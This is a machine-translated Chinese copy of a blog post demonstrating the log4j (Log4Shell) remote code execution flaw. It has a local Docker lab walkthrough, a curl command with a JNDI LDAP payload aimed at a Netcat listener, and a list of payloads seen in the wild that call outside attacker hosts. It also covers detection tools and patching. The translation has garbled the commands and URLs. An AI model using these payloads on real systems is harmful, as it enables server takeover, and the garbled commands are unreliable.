<html>
<head>
<title>Proof of concept: zero-day- log4j RCE</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">概念验证:零时差RCE</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/proof-of-concept-zero-day-log4j-rce-fb9e1364fe92?source=collection_archive---------0-----------------------#2021-12-12">https://infosecwriteups.com/proof-of-concept-zero-day-log4j-rce-fb9e1364fe92?source=collection_archive---------0-----------------------#2021-12-12</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/1874eda158e1143a5b836a7837c12d2c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/1*W7oCAejPhAcmDkW8Hy1eSA.jpeg"/></div></figure><blockquote class="ju jv jw"><p id="1f1a" class="jx jy jz ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><a class="ae kw" href="#b145" rel="noopener ugc nofollow">log4j是什么？</a></p><p id="25b9" class="jx jy jz ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><a class="ae kw" href="#fe64" rel="noopener ugc nofollow">谁会受到影响？</a></p><p id="63f2" class="jx jy jz ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><a class="ae kw" href="#7845" rel="noopener ugc nofollow">概念验证:</a></p><p id="dd8c" class="jx jy jz ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><a class="ae kw" href="#c2f8" rel="noopener ugc nofollow">上面刚刚发生了什么？</a></p><p id="69fd" class="jx jy jz ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><a class="ae kw" href="#ec1a" rel="noopener ugc nofollow">其他有效载荷</a></p><p id="2807" class="jx jy jz ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我有危险吗？</p><p id="5e37" class="jx jy jz ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><a class="ae kw" href="#a5bf" rel="noopener ugc nofollow">我如何才能安全？</a></p><p id="0977" class="jx jy jz ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><a class="ae kw" href="#60d3" rel="noopener ugc nofollow">参考文献:</a></p></blockquote><p id="cd32" class="pw-post-body-paragraph jx jy iq ka b kb kc kd ke kf kg kh ki kx kk kl km ky ko kp kq kz ks kt ku kv ij bi translated">大家好，今天，我们将看看一个特制的字符串如何导致远程代码执行(RCE)，以及这个漏洞如何影响互联网的大部分。让我们进入主题。</p><h1 id="b145" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">log4j是什么？</h1><p id="4b3e" class="pw-post-body-paragraph jx jy iq ka b kb ly kd ke kf lz kh ki kx ma kl km ky mb kp kq kz mc kt ku kv ij bi translated">Log4j是一个用java编写的日志框架。开发人员经常使用日志来找出软件中的问题发生在哪里。但是，该框架存在一个漏洞，使得攻击者能够远程执行代码(RCE)。</p><h1 id="fe64" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated"><strong class="ak">谁会受到影响？</strong></h1><p id="1f8d" class="pw-post-body-paragraph jx jy iq ka b kb ly kd ke kf lz kh ki kx ma kl km ky mb kp kq kz mc kt ku kv ij bi translated">大多数大型科技公司都使用这个框架。据消息人士称，《我的世界》、苹果iCloud、Steam和其他一些公司都受到了影响。许多网络安全公司报告称，检测到了针对该漏洞的大规模扫描。</p><h1 id="7845" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated"><strong class="ak">概念验证:</strong></h1><p id="180b" class="pw-post-body-paragraph jx jy iq ka b kb ly kd ke kf lz kh ki kx ma kl km ky mb kp kq kz mc kt ku kv ij bi translated">如果您想在本地机器上重现此漏洞，请从Github下载此易受攻击的应用程序。<br/> <br/> <strong class="ka ir"> Github链接:</strong><a class="ae kw" href="https://github.com/leonjza/log4jpwn" rel="noopener ugc nofollow" target="_blank">https://github.com/leonjza/log4jpwn</a></p><p id="82b8" class="pw-post-body-paragraph jx jy iq ka b kb kc kd ke kf kg kh ki kx kk kl km ky ko kp kq kz ks kt ku kv ij bi translated"><strong class="ka ir">第一步:</strong>克隆存储库并进入目录</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi md"><img src="../Images/918abbaad6b39f68491068e9f1efe646.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3RgJbFaoU_NW5ivLd9vNIg.png"/></div></div></figure><p id="4984" class="pw-post-body-paragraph jx jy iq ka b kb kc kd ke kf kg kh ki kx kk kl km ky ko kp kq kz ks kt ku kv ij bi translated"><strong class="ka ir">第二步:</strong>使用docker通过以下命令构建一个映像。</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi mm"><img src="../Images/c31700b3bdb7efcaa1a95ad6bd48b186.png" data-original-src="https://miro.medium.com/v2/resize:fit:1330/format:webp/1*sEu0NXOq2k94mgdPHOferA.png"/></div></figure><p id="812e" class="pw-post-body-paragraph jx jy iq ka b kb kc kd ke kf kg kh ki kx kk kl km ky ko kp kq kz ks kt ku kv ij bi translated"><strong class="ka ir">步骤3: </strong>运行docker容器，如下所示</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi mn"><img src="../Images/f029d6fae87a4f6a4ce1bf72a562e9de.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fkIPt_eOcxfYq5bz7gQ5yQ.png"/></div></div></figure><p id="a039" class="pw-post-body-paragraph jx jy iq ka b kb kc kd ke kf kg kh ki kx kk kl km ky ko kp kq kz ks kt ku kv ij bi translated"><strong class="ka ir">步骤4: </strong>打开一个新的终端，启动一个Netcat监听器</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi mo"><img src="../Images/d0027f6608cf5f6014ab9706cd40a98d.png" data-original-src="https://miro.medium.com/v2/resize:fit:850/format:webp/1*mzJcdDN0QrKhSq4_xS-WOA.png"/></div></figure><p id="ddc4" class="pw-post-body-paragraph jx jy iq ka b kb kc kd ke kf kg kh ki kx kk kl km ky ko kp kq kz ks kt ku kv ij bi translated"><strong class="ka ir">第五步:</strong>提出卷曲请求</p><blockquote class="ju jv jw"><p id="54f5" class="jx jy jz ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">curl -H '用户代理:$ { JNDI:LDAP://172 . 17 . 0 . 1:8055/a } '本地主机:1334</p></blockquote><figure class="me mf mg mh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi mn"><img src="../Images/32006b755c1e9cce57f778f9cf6ed74d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NlXaliUtlPBcl2V3OLYF5w.png"/></div></div></figure><p id="d108" class="pw-post-body-paragraph jx jy iq ka b kb kc kd ke kf kg kh ki kx kk kl km ky ko kp kq kz ks kt ku kv ij bi translated"><strong class="ka ir">步骤6: </strong>现在查看Netcat监听器，您将能够看到接收到的连接。</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi mn"><img src="../Images/9ada142cc8b8535e20427ece854fd8d3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*u3OixxFIwk13ZIZY7Jn-qA.png"/></div></div></figure><h1 id="c2f8" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated"><strong class="ak">上面刚刚发生了什么:</strong></h1><p id="9a3e" class="pw-post-body-paragraph jx jy iq ka b kb ly kd ke kf lz kh ki kx ma kl km ky mb kp kq kz mc kt ku kv ij bi translated">curl请求中的有效负载触发了步骤5中的log4j漏洞，导致服务器向攻击者的服务器发送请求。这个响应包含一个远程java类文件的路径，该文件被注入到服务器进程中。</p><h1 id="ec1a" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated"><strong class="ak">其他有效载荷:</strong></h1><p id="0ff7" class="pw-post-body-paragraph jx jy iq ka b kb ly kd ke kf lz kh ki kx ma kl km ky mb kp kq kz mc kt ku kv ij bi translated">以下是一些在野外捕获的其他有效载荷。<br/>LDAP://2862853 fca0b . bingsearchlib . com:39356/a<br/>LDAP://45 . 155 . 205 . 233:12344/Basic/Command/Base64/<br/>LDAP://x . x . x . x . c 6 pnncggjk 7 JK 873 c 9 e 0cg 3 zzcoyyyyn . interact sh . com/999<br/>LDAP://x . x . x . x</p><h1 id="2400" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated"><strong class="ak">我有危险吗:</strong></h1><p id="dcae" class="pw-post-body-paragraph jx jy iq ka b kb ly kd ke kf lz kh ki kx ma kl km ky mb kp kq kz mc kt ku kv ij bi translated">此框架的2.10到2.14版本易受攻击。如果你在使用这两个版本中的任何一个，你就有风险。然而，你也可以找到，如果你是脆弱的，或者没有几个工具的帮助。我在下面列出了其中的一些。</p><p id="ad43" class="pw-post-body-paragraph jx jy iq ka b kb kc kd ke kf kg kh ki kx kk kl km ky ko kp kq kz ks kt ku kv ij bi translated"><a class="ae kw" href="https://gist.github.com/byt3bl33d3r/46661bc206d323e6770907d259e009b6" rel="noopener ugc nofollow" target="_blank">https://gist . github . com/byt 3 bl 33d 3 r/46661 BC 206d 323 e 6770907d 259 e 009 b 6</a></p><p id="d0e6" class="pw-post-body-paragraph jx jy iq ka b kb kc kd ke kf kg kh ki kx kk kl km ky ko kp kq kz ks kt ku kv ij bi translated"><a class="ae kw" href="https://twitter.com/thinkstcanary/status/1469439743905697797?s=21" rel="noopener ugc nofollow" target="_blank">https://Twitter . com/thinkstcanary/status/1469439743905697797？s=21 </a></p><h1 id="a5bf" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated"><strong class="ak">我怎样才能安全:</strong></h1><p id="1722" class="pw-post-body-paragraph jx jy iq ka b kb ly kd ke kf lz kh ki kx ma kl km ky mb kp kq kz mc kt ku kv ij bi translated">补丁已经开始推出。该漏洞已在2.15版中得到解决，尽管仍需要Java 8。他们都不能升级到java 8，因为它可能会在代码库中产生一些冲突，所以Lunasec建议了一些临时解决方案。可以在下面的链接中找到。<br/><a class="ae kw" href="https://www.lunasec.io/docs/blog/log4j-zero-day/" rel="noopener ugc nofollow" target="_blank">https://www.lunasec.io/docs/blog/log4j-zero-day/</a></p><h1 id="87d6" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">最终想法:</h1><p id="6fec" class="pw-post-body-paragraph jx jy iq ka b kb ly kd ke kf lz kh ki kx ma kl km ky mb kp kq kz mc kt ku kv ij bi translated">如果你喜欢我的工作，你可以在这里给我买杯咖啡</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><a href="https://www.buymeacoffee.com/UVvirus"><div class="gh gi mp"><img src="../Images/55f8dd51be2f7a62a32e4f4e73b6c34c.png" data-original-src="https://miro.medium.com/v2/resize:fit:348/format:webp/1*VQZ6H9x_DejwzGc_2hlJKA.png"/></div></a></figure><h1 id="60d3" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated"><strong class="ak">参考文献:</strong></h1><figure class="me mf mg mh gt jr"><div class="bz fp l di"><div class="mq mr l"/></div></figure><figure class="me mf mg mh gt jr"><div class="bz fp l di"><div class="mq mr l"/></div></figure><div class="ms mt gp gr mu mv"><a href="https://github.com/leonjza/log4jpwn" rel="noopener  ugc nofollow" target="_blank"><div class="mw ab fo"><div class="mx ab my cl cj mz"><h2 class="bd ir gy z fp na fr fs nb fu fw ip bi translated">GitHub-Leon jza/log 4 jpwn:log4j rce测试环境</h2><div class="nc l"><h3 class="bd b gy z fp na fr fs nb fu fw dk translated">log4j rce测试环境参见:https://www.lunasec.io/docs/blog/log4j-zero-day/要么在您的主机上用</h3></div><div class="nd l"><p class="bd b dl z fp na fr fs nb fu fw dk translated">github.com</p></div></div><div class="ne l"><div class="nf l ng nh ni ne nj js mv"/></div></div></a></div><div class="ms mt gp gr mu mv"><a href="https://www.lunasec.io/docs/blog/log4j-zero-day/" rel="noopener  ugc nofollow" target="_blank"><div class="mw ab fo"><div class="mx ab my cl cj mz"><h2 class="bd ir gy z fp na fr fs nb fu fw ip bi translated">Log4Shell:在log4j 2(一个流行的Java日志包| LunaSec)中发现RCE 0天漏洞</h2><div class="nc l"><h3 class="bd b gy z fp na fr fs nb fu fw dk translated">7分钟阅读更新@太平洋标准时间12月11日下午7:30这篇博文在https://log4shell.com/也有几个小时…</h3></div><div class="nd l"><p class="bd b dl z fp na fr fs nb fu fw dk translated">www.lunasec.io</p></div></div><div class="ne l"><div class="nk l ng nh ni ne nj js mv"/></div></div></a></div></div></div>    
</body>
</html>